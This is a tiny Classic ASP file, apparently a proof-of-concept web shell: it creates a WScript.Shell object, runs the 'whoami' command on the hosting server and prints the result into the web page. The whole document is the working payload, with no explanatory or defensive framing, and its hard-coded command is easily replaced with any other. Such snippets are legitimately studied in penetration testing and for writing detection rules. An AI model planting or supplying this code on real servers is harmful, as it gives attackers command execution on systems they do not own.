<%
Set webshell = CreateObject("WScript.Shell")
Set cmd = webshell.Exec("whoami")
output = cmd.StdOut.Readall()
Response.write(output)
%>
